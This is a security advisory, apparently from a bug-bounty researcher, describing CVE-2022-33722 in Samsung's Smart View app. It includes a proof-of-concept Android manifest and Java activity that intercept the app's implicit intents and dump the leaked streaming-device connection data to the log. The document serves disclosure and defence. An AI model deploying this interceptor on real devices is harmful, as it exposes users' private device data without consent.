# Details

<table>
    <tr>
        <td>Name</td>
        <td>Smart View</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.smartmirroring</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.27</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.08.02</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33722">CVE-2022-33722</a> (SVE-2022-0769)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$720</td>
    </tr>
</table>

# Description

Oversecured found the use of implicit intents in the app when launching activities that revealed information about connected streaming devices:
![](04%20رئيسية/Samsung%20Vulnerabilities/023.%20Smart%20View%20—%20Leakage%20of%20connection%20data%20about%20streamed%20devices/Oversecured_report.png)

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter android:priority="999">
        <action android:name="com.samsung.android.service.stplatform.ACTION_LAUNCH_CONFIGURATION_UI" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
    <intent-filter android:priority="999">
        <action android:name="com.samsung.intent.action.WIFIDISPLAYSINKPLAYER" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

File `InterceptActivity.java`:
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    DumpUtils.dump(getIntent(), getForeignClassLoader(getCallingPackage()));
    finish();
}

private ClassLoader getForeignClassLoader(String packageName) {
    try {
        return createPackageContext(packageName, CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY)
                .getClassLoader();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
